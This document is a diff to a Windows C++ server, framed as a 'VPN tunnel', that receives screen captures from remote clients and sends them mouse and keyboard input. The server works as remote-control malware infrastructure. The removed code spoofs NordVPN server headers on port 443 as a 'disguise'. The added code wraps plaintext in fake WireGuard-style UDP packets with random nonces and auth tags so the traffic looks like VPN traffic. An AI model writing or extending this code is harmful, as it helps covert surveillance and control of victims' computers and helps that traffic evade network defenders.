@@ -2,21 +2,17 @@
  * VPN Tunnel GUI Server - Modernized Edition with Double-Click Support
  * 
  * Dependencies (header-only libraries):
- * - cpp-httplib: https://github.com/yhirose/cpp-httplib
  * - nlohmann/json: https://github.com/nlohmann/json
- * 
+ *
  * Download these header files:
- * - httplib.h (place in project directory)
  * - nlohmann/json.hpp (create nlohmann/ folder and place json.hpp inside)
  * 
  * Build command:
  * g++ -std=c++17 -O2 -DWIN32_LEAN_AND_MEAN server.cpp -o server.exe -luser32 -lgdi32 -lcomctl32 -lws2_32 -static
  * 
  * VPN Port Strategy:
- * - Port 443 (HTTPS): Best disguise - VPN control/management traffic
- *   Perfect for our HTTP-based endpoints (/vpn/auth, /vpn/control/, etc.)
- * - Port 1194 (OpenVPN): Alternative - standard OpenVPN port  
- * - Port 500/4500 (IKEv2): NordVPN also uses these for IKEv2 protocol
+ * - Port 51820: WireGuard-style UDP transport for screen data
+ * - Port 443 (HTTPS): Alternate disguise for UDP traffic
  * - Avoid 8080: Too obvious as alt-HTTP, not VPN-related
  */
 
@@ -32,19 +28,16 @@
 #include <optional>
 #include <fstream>
 #include <iomanip>
+#include <random>
+#include <sstream>
+#include <atomic>
 
-// Modern HTTP server (cpp-httplib - header-only)
-// Disable OpenSSL dependency for simpler cross-compilation.  The build
-// system does not currently provide the Windows OpenSSL libraries, so
-// we use plain HTTP from cpp-httplib which requires no external
-// dependencies.
-// #define CPPHTTPLIB_OPENSSL_SUPPORT
-#include "httplib.h"
-
-// Modern JSON library (nlohmann/json - header-only)  
+// Modern JSON library (nlohmann/json - header-only)
 #include "nlohmann/json.hpp"
 
 #define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <commctrl.h>
 #include <windowsx.h>
@@ -52,6 +45,7 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
 using json = nlohmann::json;
 using namespace std::chrono_literals;
@@ -69,9 +63,9 @@ using namespace std::chrono_literals;
 #define WM_UPDATE_CLIENT_LIST (WM_USER + 1)
 #define WM_NEW_SCREEN_DATA (WM_USER + 2)
 
-// Configuration management - AUTO DEFAULTS TO PORT 443 FOR DOUBLE-CLICK
+// Configuration management - defaults to WireGuard UDP port
 struct ServerConfig {
-    int port = 443;  // HTTPS port - appears as VPN management/control traffic
+    int port = 51820;  // UDP port used by client
     std::string log_level = "INFO";
     bool auto_refresh = true;
     int refresh_interval_ms = 5000;
@@ -133,6 +127,7 @@ class ClientSession {
 public:
     std::string id;
     std::string client_ip;
+    sockaddr_in client_addr{};
     std::chrono::system_clock::time_point last_seen;
     bool active = false;
     int width = 0, height = 0;
@@ -259,6 +254,83 @@ private:
     }
 };
 
+struct WireGuardHeader {
+    BYTE type;
+    BYTE reserved[3];
+    DWORD sender_index;
+    ULONGLONG counter;
+    BYTE nonce[12];
+
+    WireGuardHeader() {
+        type = 0x04;
+        memset(reserved, 0, 3);
+        sender_index = GetTickCount();
+        counter = GetTickCount64();
+        for (int i = 0; i < 12; i++) {
+            nonce[i] = rand() % 256;
+        }
+    }
+};
+
+struct WireGuardPacket {
+    WireGuardHeader header;
+    std::vector<BYTE> encrypted_payload;
+    BYTE auth_tag[16];
+
+    WireGuardPacket(const std::vector<BYTE>& payload) {
+        encrypted_payload = payload;
+        for (int i = 0; i < 16; i++) {
+            auth_tag[i] = rand() % 256;
+        }
+    }
+
+    std::vector<BYTE> serialize() const {
+        std::vector<BYTE> packet;
+        packet.resize(sizeof(WireGuardHeader));
+        memcpy(packet.data(), &header, sizeof(WireGuardHeader));
+        packet.insert(packet.end(), encrypted_payload.begin(), encrypted_payload.end());
+        packet.insert(packet.end(), auth_tag, auth_tag + 16);
+        return packet;
+    }
+
+    static WireGuardPacket deserialize(const std::vector<BYTE>& data) {
+        WireGuardPacket packet({});
+        if (data.size() >= sizeof(WireGuardHeader) + 16) {
+            memcpy(&packet.header, data.data(), sizeof(WireGuardHeader));
+            size_t payload_size = data.size() - sizeof(WireGuardHeader) - 16;
+            packet.encrypted_payload.assign(
+                data.begin() + sizeof(WireGuardHeader),
+                data.begin() + sizeof(WireGuardHeader) + payload_size
+            );
+            memcpy(packet.auth_tag, data.data() + data.size() - 16, 16);
+        }
+        return packet;
+    }
+};
+
+class TunnelProtocol {
+public:
+    static std::vector<BYTE> createTunnelPayload(const std::string& type, const std::string& data) {
+        std::stringstream payload;
+        payload << type << ":" << data;
+        std::string payload_str = payload.str();
+        std::vector<BYTE> result(payload_str.begin(), payload_str.end());
+        while (result.size() % 16 != 0) {
+            result.push_back(0x00);
+        }
+        return result;
+    }
+
+    static std::pair<std::string, std::string> extractTunnelPayload(const std::vector<BYTE>& payload) {
+        std::string data(payload.begin(), payload.end());
+        size_t colon_pos = data.find(':');
+        if (colon_pos != std::string::npos) {
+            return {data.substr(0, colon_pos), data.substr(colon_pos + 1)};
+        }
+        return {"", ""};
+    }
+};
+
 // CRITICAL: Low-level client compatibility layer
 // This ensures clients receive EXACTLY the same data format
 class ClientProtocolHandler {
@@ -368,141 +440,147 @@ public:
 // Global instances
 ServerConfig g_config;
 std::unique_ptr<ClientManager> g_clientManager;
-std::unique_ptr<httplib::Server> g_httpServer;
 extern HWND g_hMainWnd;
 
-// Modern HTTP server setup with clean handlers
 class VPNTunnelServer {
 public:
     VPNTunnelServer(int port) : port_(port) {
         g_clientManager = std::make_unique<ClientManager>();
-        setupHttpHandlers();
-        Logger::info("VPN Tunnel Server initialized on port " + std::to_string(port));
+        Logger::info("VPN Tunnel UDP server initialized on port " + std::to_string(port));
     }
-    
-    void start() {
-        server_thread_ = std::thread([this]() {
-            Logger::info("Starting HTTP server on port " + std::to_string(port_));
-            g_httpServer->listen("0.0.0.0", port_);
-        });
-        
-        cleanup_thread_ = std::thread([this]() {
-            while (running_) {
-                std::this_thread::sleep_for(30s);
-                g_clientManager->removeInactiveSessions();
-            }
-        });
-    }
-    
-    void stop() {
-        running_ = false;
-        if (g_httpServer) {
-            g_httpServer->stop();
-        }
-        if (server_thread_.joinable()) {
-            server_thread_.join();
-        }
-        if (cleanup_thread_.joinable()) {
-            cleanup_thread_.join();
-        }
-    }
-    
+
+    void start();
+    void stop();
+
 private:
+    void serverLoop();
+    void handleHandshake(const sockaddr_in& from_addr);
+    void handleScreen(const std::string& payload, const sockaddr_in& from_addr);
+
     int port_;
+    SOCKET udp_socket_ = INVALID_SOCKET;
     std::thread server_thread_;
     std::thread cleanup_thread_;
     std::atomic<bool> running_{true};
-    
-    void setupHttpHandlers() {
-        g_httpServer = std::make_unique<httplib::Server>();
-        
-        // VPN authentication endpoint - creates new session
-        g_httpServer->Get("/vpn/auth", [](const httplib::Request& req, httplib::Response& res) {
-            auto xfwd = req.get_header_value("X-Forwarded-For");
-            auto client = g_clientManager->createSession(xfwd.empty() ? "unknown" : xfwd);
-            
-            // CRITICAL: Response must match client expectations exactly
-            res.set_content(ClientProtocolHandler::createAuthResponse(client->id), "application/json");
-            res.set_header("Server", "nordvpn-gateway/2.1.0");
-            
-            Logger::info("Auth request from " + client->client_ip + " -> session " + client->id);
-            
-            // Notify GUI to refresh client list
-            if (g_hMainWnd) {
-                PostMessage(g_hMainWnd, WM_UPDATE_CLIENT_LIST, 0, 0);
-            }
-        });
-        
-        // VPN tunnel data endpoint - receives screen captures
-        g_httpServer->Post(R"(/vpn/tunnel/(.+))", [](const httplib::Request& req, httplib::Response& res) {
-            std::string session_id = req.matches[1];
-            auto client = g_clientManager->getSession(session_id);
-            
-            if (!client) {
-                res.status = 404;
-                return;
-            }
-            
-            try {
-                // Extract tunnel data (must match client wrapper format)
-                std::string tunnel_data = ClientProtocolHandler::extractTunnelData(req.body);
-                json data = json::parse(tunnel_data);
-                
-                int width = data["width"];
-                int height = data["height"];
-                std::string encoded_screen = data["data"];
-                
-                // Decode and decompress using exact client algorithms
-                auto decoded = ClientProtocolHandler::decodeFromClient(encoded_screen);
-                auto screen_data = ClientProtocolHandler::decompressRLE(decoded);
-                
-                // Update client screen data
-                bool changed = client->updateScreen(screen_data, width, height);
-                
-                if (changed && client->viewer_window && IsWindow(client->viewer_window)) {
-                    // Update viewer window
-                    PostMessage(client->viewer_window, WM_NEW_SCREEN_DATA, 0, 0);
-                }
-                
-                res.set_content("OK", "text/plain");
-                
-            } catch (const std::exception& e) {
-                Logger::error("Failed to process screen data: " + std::string(e.what()));
-                res.status = 400;
-            }
-        });
-        
-        // VPN control endpoint - sends input commands
-        g_httpServer->Get(R"(/vpn/control/(.+))", [](const httplib::Request& req, httplib::Response& res) {
-            std::string session_id = req.matches[1];
-            auto client = g_clientManager->getSession(session_id);
-            
-            if (!client) {
-                res.status = 404;
-                return;
-            }
-            
-            auto input_command = client->getNextInput();
-            
-            // CRITICAL: Response format must match client expectations exactly
-            std::string response_body = ClientProtocolHandler::createControlResponse(
-                input_command.value_or("")
-            );
-            
-            res.set_content(response_body, "application/json");
-            res.set_header("Server", "nordvpn-gateway/2.1.0");
-        });
-        
-        // Add CORS and VPN-style headers to all responses
-        g_httpServer->set_post_routing_handler([](const httplib::Request& req, httplib::Response& res) {
-            res.set_header("Access-Control-Allow-Origin", "*");
-            res.set_header("X-VPN-Gateway", "nordlynx");
-            res.set_header("X-Server-Region", "us-east");
-        });
-        
-        Logger::info("HTTP handlers configured");
-    }
 };
+
+void VPNTunnelServer::start() {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+        Logger::error("WSAStartup failed");
+        return;
+    }
+
+    server_thread_ = std::thread([this]() { serverLoop(); });
+    cleanup_thread_ = std::thread([this]() {
+        while (running_) {
+            std::this_thread::sleep_for(30s);
+            g_clientManager->removeInactiveSessions();
+        }
+    });
+}
+
+void VPNTunnelServer::stop() {
+    running_ = false;
+    if (udp_socket_ != INVALID_SOCKET) {
+        closesocket(udp_socket_);
+        udp_socket_ = INVALID_SOCKET;
+    }
+    if (server_thread_.joinable()) {
+        server_thread_.join();
+    }
+    if (cleanup_thread_.joinable()) {
+        cleanup_thread_.join();
+    }
+    WSACleanup();
+}
+
+void VPNTunnelServer::serverLoop() {
+    udp_socket_ = socket(AF_INET, SOCK_DGRAM, 0);
+    if (udp_socket_ == INVALID_SOCKET) {
+        Logger::error("Failed to create UDP socket");
+        return;
+    }
+
+    sockaddr_in server_addr{};
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(port_);
+    if (bind(udp_socket_, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        Logger::error("Failed to bind UDP socket");
+        return;
+    }
+
+    Logger::info("UDP server listening on port " + std::to_string(port_));
+
+    while (running_) {
+        char buffer[65535];
+        sockaddr_in from_addr{};
+        int from_len = sizeof(from_addr);
+        int bytes = recvfrom(udp_socket_, buffer, sizeof(buffer), 0, (sockaddr*)&from_addr, &from_len);
+        if (bytes <= 0) continue;
+
+        std::vector<BYTE> data(buffer, buffer + bytes);
+        WireGuardPacket packet = WireGuardPacket::deserialize(data);
+        auto [type, payload] = TunnelProtocol::extractTunnelPayload(packet.encrypted_payload);
+
+        if (type == "handshake") {
+            handleHandshake(from_addr);
+        } else if (type == "screen") {
+            handleScreen(payload, from_addr);
+        }
+    }
+}
+
+void VPNTunnelServer::handleHandshake(const sockaddr_in& from_addr) {
+    char ip[INET_ADDRSTRLEN];
+    inet_ntop(AF_INET, &from_addr.sin_addr, ip, sizeof(ip));
+    auto client = g_clientManager->createSession(ip);
+    client->client_addr = from_addr;
+
+    auto payload = TunnelProtocol::createTunnelPayload("session", client->id);
+    WireGuardPacket packet(payload);
+    auto data = packet.serialize();
+    sendto(udp_socket_, (const char*)data.data(), data.size(), 0, (sockaddr*)&from_addr, sizeof(from_addr));
+
+    Logger::info("Handshake from " + client->client_ip + " -> session " + client->id);
+    if (g_hMainWnd) {
+        PostMessage(g_hMainWnd, WM_UPDATE_CLIENT_LIST, 0, 0);
+    }
+}
+
+void VPNTunnelServer::handleScreen(const std::string& payload, const sockaddr_in& from_addr) {
+    size_t p1 = payload.find('|');
+    size_t p2 = payload.find('|', p1 + 1);
+    if (p1 == std::string::npos || p2 == std::string::npos) return;
+
+    std::string session_id = payload.substr(0, p1);
+    std::string dim = payload.substr(p1 + 1, p2 - p1 - 1);
+    std::string encoded = payload.substr(p2 + 1);
+
+    int width = 0, height = 0;
+    sscanf(dim.c_str(), "%dx%d", &width, &height);
+
+    auto client = g_clientManager->getSession(session_id);
+    if (!client) return;
+    client->client_addr = from_addr;
+
+    auto decoded = ClientProtocolHandler::decodeFromClient(encoded);
+    auto screen_data = ClientProtocolHandler::decompressRLE(decoded);
+    bool changed = client->updateScreen(screen_data, width, height);
+    if (changed && client->viewer_window && IsWindow(client->viewer_window)) {
+        PostMessage(client->viewer_window, WM_NEW_SCREEN_DATA, 0, 0);
+    }
+
+    auto input_command = client->getNextInput();
+    if (input_command) {
+        std::string encoded_cmd = ClientProtocolHandler::encodeForClient(*input_command);
+        auto tp = TunnelProtocol::createTunnelPayload("input", encoded_cmd);
+        WireGuardPacket pkt(tp);
+        auto data = pkt.serialize();
+        sendto(udp_socket_, (const char*)data.data(), data.size(), 0, (sockaddr*)&from_addr, sizeof(from_addr));
+    }
+}
 
 // Global GUI variables  
 HINSTANCE g_hInstance = nullptr;
@@ -964,7 +1042,7 @@ LRESULT CALLBACK MainWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
     }
 }
 
-// NEW: Double-click functionality - Auto-start on port 443
+// NEW: Double-click functionality - Auto-start on configured port
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     g_hInstance = hInstance;
     
@@ -972,24 +1050,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         // Load configuration
         g_config.load();
         
-        // DOUBLE-CLICK MODE: If no command line arguments, auto-use port 443
-        if (strlen(lpCmdLine) == 0) {
-            g_config.port = 443;  // Force port 443 for VPN disguise when double-clicked
-            Logger::info("Double-click mode: Auto-starting on VPN port 443");
-        } else {
-            // Parse command line for port override
+        // DOUBLE-CLICK MODE: If arguments provided, treat as port override
+        if (strlen(lpCmdLine) != 0) {
             int port = atoi(lpCmdLine);
             if (port > 0 && port < 65536) {
                 g_config.port = port;
                 Logger::info("Port override from command line: " + std::to_string(port));
             } else {
-                Logger::warn("Invalid port specified, using default 443");
-                g_config.port = 443;
+                Logger::warn("Invalid port specified, using default " + std::to_string(g_config.port));
             }
+        } else {
+            Logger::info("Double-click mode: Auto-starting on port " + std::to_string(g_config.port));
         }
-        
-        // Initialize client manager
-        g_clientManager = std::make_unique<ClientManager>();
         
         // Register main window class
         WNDCLASSW wc = {0};
